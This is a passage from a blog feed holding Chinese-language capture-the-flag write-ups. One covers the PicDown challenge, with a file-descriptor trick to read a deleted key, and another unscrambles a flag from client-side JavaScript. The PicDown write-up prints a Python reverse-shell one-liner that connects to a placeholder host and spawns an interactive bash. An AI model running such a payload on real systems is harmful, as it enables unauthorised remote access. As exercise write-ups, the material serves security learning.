class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><h4><span id="åˆ†æ">åˆ†æ</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure><p>æ‰“å¼€<code>/tmp/secret.txt</code>ï¼Œè¯»å…¥SECRET_KEYï¼Œå¹¶åˆ é™¤æ‰ ï¼ˆremove</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>éœ€è¦ç”¨keyæ¥getshell</p><h4><span id="æ–‡ä»¶æè¿°ç¬¦fd">æ–‡ä»¶æè¿°ç¬¦fd</span></h4><blockquote><p>æ–‡ä»¶æè¿°ç¬¦ï¼šFile descriptor,ç®€ç§°fdï¼Œå½“åº”ç”¨ç¨‹åºè¯·æ±‚å†…æ ¸æ‰“å¼€/æ–°å»ºä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨äºå¯¹åº”è¿™ä¸ªæ‰“å¼€/æ–°å»ºçš„æ–‡ä»¶ï¼Œå…¶fdæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ï¼ŒæŒ‡å‘å†…æ ¸ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æ‰€ç»´æŠ¤çš„è¯¥è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„è®°å½•è¡¨ã€‚å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œä¸€äº›æ¶‰åŠåº•å±‚çš„ç¨‹åºç¼–å†™å¾€å¾€ä¼šå›´ç»•ç€æ–‡ä»¶æè¿°ç¬¦å±•å¼€ã€‚ä½†æ˜¯æ–‡ä»¶æè¿°ç¬¦è¿™ä¸€æ¦‚å¿µå¾€å¾€åªé€‚ç”¨äºUNIXã€Linuxè¿™æ ·çš„æ“ä½œç³»ç»Ÿã€‚</p></blockquote><p>å½“ä¸€ä¸ªæ–°è¿›ç¨‹å»ºç«‹æ—¶ï¼Œæ­¤è¿›ç¨‹å°†é»˜è®¤æœ‰ 0ï¼Œ1ï¼Œ2 çš„æ–‡ä»¶æè¿°ç¬¦</p><table><thead><tr><th>æ–‡ä»¶æè¿°ç¬¦</th><th>ç¼©å†™</th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>æ ‡å‡†è¾“å…¥</td></tr><tr><td>1</td><td>STDOUT</td><td>æ ‡å‡†è¾“å‡º</td></tr><tr><td>2</td><td>STDERR</td><td>æ ‡å‡†é”™è¯¯è¾“å‡º</td></tr></tbody></table><blockquote><p>å…¶å®æˆ‘ä»¬ä¸è®¡ç®—æœºä¹‹é—´çš„äº¤äº’æ˜¯æˆ‘å¯ä»¥è¾“å…¥ä¸€äº›æŒ‡ä»¤ä¹‹åå®ƒç»™æˆ‘ä¸€äº›è¾“å‡ºã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠä¸Šé¢è¡¨æ ¼ä¸­çš„æ–‡ä»¶æè¿°ç¬¦0ç†è§£ä¸ºæˆ‘å’Œè®¡ç®—æœºäº¤äº’æ—¶çš„è¾“å…¥ï¼Œè€Œè¿™ä¸ªè¾“å…¥é»˜è®¤æ˜¯æŒ‡å‘é”®ç›˜çš„; æ–‡ä»¶æè¿°ç¬¦1ç†è§£ä¸ºæˆ‘å’Œè®¡ç®—æœºäº¤äº’æ—¶çš„è¾“å‡ºï¼Œè€Œè¿™ä¸ªè¾“å‡ºé»˜è®¤æ˜¯æŒ‡å‘æ˜¾ç¤ºå™¨çš„ï¼›æ–‡ä»¶æè¿°ç¬¦2ç†è§£ä¸ºæˆ‘å’Œè®¡ç®—æœºäº¤äº’æ—¶ï¼Œè®¡ç®—æœºå‡ºç°é”™è¯¯æ—¶çš„è¾“å‡ºï¼Œè€Œè¿™ä¸ªè¾“å‡ºé»˜è®¤æ˜¯å’Œæ–‡ä»¶æè¿°ç¬¦1æŒ‡å‘ä¸€ä¸ªä½ç½®;</p></blockquote><p>æ‰€ä»¥0ï¼Œ1ï¼Œ2ä¸€èˆ¬ä¼šæŒ‡å‘<strong>ç»ˆç«¯</strong></p><p>å½“è¿™ä¸ªè¿›ç¨‹å»æ‰“å¼€ä¸€ä¸ª<strong>æ–°çš„æ–‡ä»¶</strong>æ—¶ï¼š</p><blockquote><p>å¦‚æœæ­¤æ—¶å»æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¼šæ˜¯ <strong>3</strong> ã€‚POSIX æ ‡å‡†è¦æ±‚æ¯æ¬¡æ‰“å¼€æ–‡ä»¶æ—¶ï¼ˆå«socketï¼‰å¿…é¡»ä½¿ç”¨å½“å‰è¿›ç¨‹ä¸­æœ€å°å¯ç”¨çš„æ–‡ä»¶æè¿°ç¬¦å·</p><p><strong>æ­¤æ–‡ä»¶æè¿°ç¬¦ç”¨æ¥æŒ‡å®šå¾…è¯»å†™çš„æ–‡ä»¶</strong></p></blockquote><p>â€‹        <strong>è€Œåœ¨è¿›ç¨‹çš„è¿è¡Œä¸­ï¼Œå¦‚æœåªæ˜¯åˆ é™¤æ–‡ä»¶è€Œä¸å…³é—­(close)æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ä»ç„¶å­˜åœ¨ï¼Œé€šè¿‡æ­¤è®¿é—®ç¬¦ï¼Œä¾ç„¶å¯ä»¥è®¿é—®åˆ°æ–‡ä»¶ã€‚</strong></p><h4><span id="è·å–key">è·å–key</span></h4><img src="/images/ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown/image-20210817183726750.png" alt="image-20210817183726750" style="zoom:80%;"><p>åªæ‰“å¼€äº†keyæ–‡ä»¶ï¼Œè®¿é—®<strong>3</strong>å³å¯è¯»å–åˆ°key</p><h4><span id="devfd">/dev/fd</span></h4><blockquote><ol><li><p>/dev/fdæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„â€œä¸œè¥¿â€ï¼Œå®ƒå®é™…æŒ‡å‘/proc/self/fdã€‚é‡Œé¢å­˜æ”¾çš„æ˜¯æŸä¸ªprogramæ‰€æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¸åŒçš„programæ‰€çœ‹åˆ°çš„/proc/self/fdä¸åŒã€‚æ¯”å¦‚åŒä¸€ä¸ªè´¦å·åœ¨ä¸åŒttyç™»å½•åŒä¸€å°æœåŠ¡å™¨ï¼Œaçœ‹åˆ°çš„/proc/self/fdå®é™…æ˜¯/proc/8231/fdï¼Œè€Œbçœ‹åˆ°çš„æ˜¯/proc/14133/fd</p></li><li><p>/dev/fdé‡Œæ”¾çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ã€‚é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦æœ‰3ä¸ªï¼Œ0: stdin;1: stdout; 2: stderrã€‚ä¸åŒçš„programæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦å¯èƒ½è¿˜ä¸åŒã€‚</p></li><li><p>å½“ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦è¢«å…³é—­åå†è¢«è¯•å›¾è¯»å†™ï¼Œå°±ä¼šæŠ¥é”™ã€‚</p></li></ol></blockquote><p>è¿™ç©æ„ä¼¼ä¹ä¹Ÿè¡Œï¼Œæ˜¯æŒ‡å‘**/proc/self/fd**çš„â€¦â€¦</p><p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/image-20210817184042731.png" alt="image-20210817184042731"></p><p>ä¹Ÿæœ‰è§£é‡Šç§°ï¼š/dev/fd[0-7]ï¼šæ ‡å‡†è½¯é©±    â€”â€”<a href="https://www.cnblogs.com/sdu20112013/p/11313585.html">Linux /devç›®å½•è¯¦è§£</a></p><p>å•Šâ€¦â€¦ä¸æ˜¯å¾ˆæ‡‚</p><h4><span id="å¼¹shell">å¼¹shell</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;xxxx&#x27;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« :  </p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/106196856?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control">ç½‘é¼æ¯ç™½è™ç»„web - PicDown</a></p><p><a href="https://blog.csdn.net/SopRomeo/article/details/105653176">[V&amp;N2020 å…¬å¼€èµ›]CHECKIN</a></p><p><a href="https://www.linuxprobe.com/linux-proc-pid.html">ç®€æLinuxä¸­ /proc/pid  ç›®å½•çš„å„æ–‡ä»¶</a></p><p><a href="%5Bhttp://www.itqiankun.com/article/file-fd#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%5D(http://www.itqiankun.com/article/file-fd#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)">å½»åº•ææ‡‚æ–‡ä»¶æè¿°ç¬¦fd</a></p><p><a href="https://www.jianshu.com/p/a2df1d402b4d">ç†è§£æ–‡ä»¶æè¿°ç¬¦</a></p><p><a href="https://www.cnblogs.com/sdu20112013/p/11313585.html">Linux /devç›®å½•è¯¦è§£</a></p><p><a href="https://blog.csdn.net/njchina/article/details/49251499">/dev/fd æ–‡ä»¶æè¿°ç¬¦</a></p><p><a href="https://blog.csdn.net/zhangpeterx/article/details/90672749">Linux: /dev/fd/è¯¦è§£</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>b01lers2020-Welcome-to-Earth</title>
    <link href="http://example.com/2021/08/16/b01lers2020-Welcome-to-Earth/"/>
    <id>http://example.com/2021/08/16/b01lers2020-Welcome-to-Earth/</id>
    <published>2021-08-16T07:56:47.733Z</published>
    <updated>2021-08-16T08:17:08.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>js è§£å¯†</p><a id="more"></a></blockquote><h5><span id="1-æ ¹ç•Œé¢">1. æ ¹ç•Œé¢</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>AMBUSH!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You&#x27;ve gotta escape!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        event = event || <span class="built_in">window</span>.event;</span></span><br><span class="line">        if (event.keyCode == 27) &#123;</span><br><span class="line">          event.preventDefault();</span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.location = <span class="string">&quot;/chase/&quot;</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> die();</span></span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">dietimer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">10000</span>);</span></span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">die</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      dietimer();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨1så†…é€ƒè·‘</p><h5><span id="2-chase">2. /chase/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CHASE!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      You managed to chase one of the enemy fighters, but there&#x27;s a wall coming</span><br><span class="line">      up fast!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">dietimer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">1000</span>);</span></span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">die</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">left</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">leftt</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/leftt/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">right</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      dietimer();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>äº‹ä»¶è§¦å‘ lefttâ€¦â€¦</p><h5><span id="3-leftt">3. /leftt/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>SHOOT IT<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>You&#x27;ve got the bogey in your sights, take the shot!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;window.location=&#x27;/die/&#x27;&quot;</span>&gt;</span>Take the shot<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button onClick=&quot;window.location=&#x27;/shoot/&#x27;&quot;&gt;Take the shot&lt;/button&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>â€¦â€¦</p><h5><span id="4-shoot">4. /shoot/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>YOU SHOT IT DOWN!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Well done! You also crash in the process<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;window.location=&#x27;/door/&#x27;&quot;</span>&gt;</span>Continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h5><span id="5-door">5. /door/</span></h5><p>å¾ˆå¤šæŒ‰é’®â€¦â€¦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;check_door()&quot;</span>&gt;</span>Check<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç‚¹å‡»è§¦å‘äº‹ä»¶ï¼Œçœ‹å¼•å…¥çš„jsæ–‡ä»¶</p><p>door.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5><span id="6-open">6. /open/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>YOU FOUND THE DOOR!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span>How do you open it?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹å¼•å…¥çš„js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">1</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    open(i + <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">4000000000</span>) <span class="built_in">window</span>.location = <span class="string">&quot;/fight/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5><span id="7-fight">7. /fight/</span></h5><p>åˆæ˜¯ç‚¹å‡»è§¦å‘ï¼Œjsï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€œæ··æ·†â€äº†flagï¼Œç›´æ¥æ‰‹è§£ï¼špctf{hey_boys_im_baaaaaaaaaack!}</p><p>å¤§ä½¬çš„ python è„šæœ¬è§£æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line"></span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line"><span class="keyword">if</span> k.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> k[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">print(k)</span><br></pre></td></tr></table></figure><p>ç”¨çš„å…¨æ’åˆ—ï¼ŒğŸ‚</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://www.yuque.com/u390550/kdmol2/ul9gfw">qaq</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;js è§£å¯†&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>é¡¹ç›®å­¦ä¹ åˆæœŸå°èŠ‚</title>
    <link href="http://example.com/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/"/>
    <id>http://example.com/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/</id>
    <published>2021-08-15T07:27:51.835Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
